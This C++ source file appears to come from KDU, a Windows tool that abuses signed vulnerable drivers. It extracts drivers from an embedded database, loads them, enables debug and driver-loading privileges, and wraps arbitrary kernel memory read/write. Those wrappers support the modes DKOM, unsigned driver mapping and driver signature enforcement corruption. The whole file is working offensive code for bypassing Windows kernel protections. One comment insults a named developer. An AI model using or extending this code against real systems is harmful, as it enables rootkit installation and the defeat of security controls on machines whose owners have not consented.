/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.12
*
*  DATE:        25 Jan 2022
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nal.h"
#include "idrv/rtcore.h"
#include "idrv/mapmem.h"
#include "idrv/atszio.h"
#include "idrv/winio.h"
#include "idrv/winring0.h"
#include "idrv/phymem.h"
#include "idrv/lha.h"
#include "idrv/directio64.h"
#include "idrv/gmer.h"
#include "kduplist.h"

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUProvGetReference
*
* Purpose:
*
* Return pointer to KDU providers list.
*
*/
PKDU_PROVIDER KDUProvGetReference()
{
    return g_KDUProviders;
}

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_PROVIDER* prov;
    CONST CHAR* pszDesc;
    ULONG provCount = KDUProvGetCount();

    FUNCTION_ENTER_MSG(__FUNCTION__);

    for (ULONG i = 0; i < provCount; i++) {
        prov = &g_KDUProviders[i];

        printf_s("Provider # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
            i,
            prov->Desciption,
            prov->DriverName,
            prov->DeviceName);

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            prov->SignerName);

        //
        // List provider flags.
        //
        if (prov->SignatureWHQL)
            printf_s("\tDriver is WHQL signed\r\n");
        //
        // Some Realtek drivers are digitally signed 
        // after binary modification with wrong PE checksum as result.
        // Note: Windows 7 will not allow their load.
        //
        if (prov->IgnoreChecksum)
            printf_s("\tIgnore invalid image checksum\r\n");

        //
        // List "based" flags.
        //
        if (prov->DrvSourceBase != SourceBaseNone)
        {
            switch (prov->DrvSourceBase) {
            case SourceBaseWinIo:
                pszDesc = WINIO_BASE_DESC;
                break;
            case SourceBaseWinRing0:
                pszDesc = WINRING0_BASE_DESC;
                break;
            case SourceBasePhyMem:
                pszDesc = PHYMEM_BASE_DESC;
                break;
            case SourceBaseMapMem:
                pszDesc = MAPMEM_BASE_DESC;
                break;
            default:
                pszDesc = "Unknown";
                break;
            }

            printf_s("\tBased on: %s\r\n", pszDesc);
        }

        //
        // Minimum support Windows build.
        //
        printf_s("\tMinimum supported Windows build: %lu\r\n",
            prov->MinNtBuildNumberSupport);

        //
        // Maximum support Windows build.
        //
        if (prov->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: %lu\r\n",
                prov->MaxNtBuildNumberSupport);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    PBYTE    drvBuffer;
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;

    ULONG    uResourceId = Context->Provider->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->DriverName;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {
        
        supPrintfEvent(kduEventError, 
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {

        supPrintfEvent(kduEventError, 
            "[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

        return FALSE;
    }

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        printf_s("[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {
        
        supPrintfEvent(kduEventError, 
            "[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;
    HANDLE   deviceHandle = NULL;
    LPWSTR   lpDeviceName = Context->Provider->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Vulnerable driver is already loaded\r\n");
        
        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    if (bLoaded) {

        //
        // Run pre-open callback (optional).
        //
        if (Context->Provider->Callbacks.PreOpenDriver != (PVOID)KDUProviderStub) {
            printf_s("[+] Executing pre-open callback for given provider\r\n");
            Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
        }

        ntStatus = supOpenDriver(lpDeviceName, WRITE_DAC | GENERIC_WRITE | GENERIC_READ, &deviceHandle);
        if (!NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventError,
                "[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

        }
        else {

            printf_s("[+] Vulnerable driver opened\r\n");

            Context->DeviceHandle = deviceHandle;

            //
            // Run post-open callback (optional).
            //
            if (Context->Provider->Callbacks.PostOpenDriver != (PVOID)KDUProviderStub) {

                printf_s("[+] Executing post-open callback for given provider\r\n");

                Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

            }

        }
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {
        
        supPrintfEvent(kduEventError, 
            "[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);

    }
    else {

        printf_s("[+] Vulnerable driver unloaded\r\n");
        ULONG retryCount = 3;

        do {
            Sleep(1000);
            if (DeleteFile(lpFullFileName)) {
                printf_s("[+] Vulnerable driver file removed\r\n");
                break;
            }

            retryCount--;

        } while (retryCount);

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supPrintfEvent(kduEventError,
                    "[!] Unable to set driver device security descriptor, NTSTATUS (0x%lX)\r\n", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Unable to allocate security descriptor, NTSTATUS (0x%lX)\r\n", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        GENERIC_WRITE | GENERIC_READ,
        0,
        0)))
    {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}

/*
* KDUVirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI KDUVirtualToPhysical(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    KDU_PROVIDER* prov = Context->Provider;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    return prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* KDUReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUReadKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUWriteKernelVM
*
* Purpose:
*
* Provider wrapper for WriteKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUWriteKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderStub
*
* Purpose:
*
* Stub routine.
*
*/
BOOL WINAPI KDUProviderStub(
    VOID)
{
    SetLastError(ERROR_UNSUPPORTED_TYPE);
    return TRUE;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file.
*
*/
HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    HINSTANCE hInstance;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    SetDllDirectory(NULL);
    hInstance = LoadLibraryEx(DRV64DLL, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (hInstance) {
        printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);
    }
    else {

        supPrintfEvent(kduEventError, 
            "[!] Could not load drivers database, GetLastError %lu\r\n", GetLastError());

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return hInstance;
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    BOOLEAN bInitFailed;
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_PROVIDER* prov;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        if (ProviderId >= KDUProvGetCount())
            ProviderId = KDU_PROVIDER_DEFAULT;

        prov = &g_KDUProviders[ProviderId];

        //
        // Show provider info.
        //
        printf_s("[+] Provider: %ws, Name \"%ws\"\r\n",
            prov->Desciption,
            prov->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && prov->SupportHVCI == 0) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: selected provider does not support HVCI\r\n");
            
            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < prov->MinNtBuildNumberSupport) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: selected provider require newer Windows NT version\r\n");
            
            break;
        }

        if (prov->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > prov->MaxNtBuildNumberSupport) {
                
                supPrintfEvent(kduEventError, 
                    "[!] Abort: selected provider does not support this Windows NT version\r\n");
                
                break;
            }
        }

        bInitFailed = FALSE;

        //
        // Verify key provider functionality.
        //
        switch (ActionType) {

        case ActionTypeDKOM:
        case ActionTypeMapDriver:

            //
            // Check if we can read/write.
            //
            if ((PVOID)prov->Callbacks.ReadKernelVM == (PVOID)KDUProviderStub ||
                (PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub)
            {

                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                    "\tKDU interface is not implemented for these methods.\r\n");

#ifndef _DEBUG
                bInitFailed = TRUE;
#endif
            }
            break;

        case ActionTypeDSECorruption:

            //
            // Check if we can write.
            //
            if ((PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub) {

                supPrintfEvent(kduEventError, 
                    "[!] Abort: selected provider does not support arbitrary kernel write.\r\n");

#ifndef _DEBUG
                bInitFailed = TRUE;
#endif

            }
            break;

        default:
            break;
        }

        if (bInitFailed)
            break;

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        NTSTATUS ntStatus;

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: SeDebugPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: SeLoadDriverPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {
            
            supPrintfEvent(kduEventError, 
                "[!] Abort: could not allocate provider context\r\n");
            
            break;
        }

        Context->Provider = &g_KDUProviders[ProviderId];

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(Context->Provider->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, Context->Provider->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));

            if (KDUProvStartVulnerableDriver(Context)) {

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver != KDUProviderStub) {

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        UlongToPtr(Context->Provider->ResourceId)))
                    {

                        supPrintfEvent(kduEventError, 
                            "[!] Could not register driver, GetLastError %lu\r\n", GetLastError());

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Reelease Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        //
        // Unregister driver if supported.
        //
        if ((PVOID)Context->Provider->Callbacks.UnregisterDriver != KDUProviderStub) {
            Context->Provider->Callbacks.UnregisterDriver(
                Context->DeviceHandle, 
                (PVOID)Context);
        }

        if (Context->DeviceHandle)
            NtClose(Context->DeviceHandle);

        //
        // Unload driver.
        //
        KDUProvStopVulnerableDriver(Context);

        if (Context->DriverFileName)
            supHeapFree(Context->DriverFileName);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}
